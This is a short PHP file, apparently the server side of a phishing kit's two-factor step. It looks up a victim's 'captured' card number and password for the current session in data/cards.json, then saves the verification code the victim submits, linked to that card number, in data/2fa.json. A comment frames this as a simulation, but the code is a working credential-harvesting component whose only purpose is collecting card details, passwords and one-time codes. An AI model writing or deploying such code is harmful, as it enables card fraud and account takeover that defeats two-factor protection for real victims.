<?php
session_start();
$codeSubmitted = false;

// Read the card information from cards.json to simulate accessing previously captured data
$sessionId = session_id();
$cardNumber = "";
$password = "";

if (file_exists('data/cards.json')) {
    $cardsData = json_decode(file_get_contents('data/cards.json'), true) ?? [];
    foreach ($cardsData as $entry) {
        if ($entry['session_id'] === $sessionId) {
            $cardNumber = $entry['card_number'];
            $password = $entry['password'];
            break;
        }
    }
}

// Process the verification code if submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['verification_code'])) {
    $verificationCode = $_POST['verification_code'] ?? '';
    
    // Record the verification code entry
    $entry = [
        'session_id' => $sessionId,
        'date' => date('Y-m-d H:i:s'),
        'verification_code' => $verificationCode,
        'card_number' => $cardNumber // Link to the captured card number
    ];
    
    // Save to 2fa.json
    $jsonFile = 'data/2fa.json';
    $currentData = [];
    
    if (file_exists($jsonFile)) {
        $jsonStr = file_get_contents($jsonFile);
        $currentData = json_decode($jsonStr, true) ?? [];
    }
    
    $currentData[] = $entry;
    file_put_contents($jsonFile, json_encode($currentData, JSON_PRETTY_PRINT));
    
    $codeSubmitted = true;
}
?>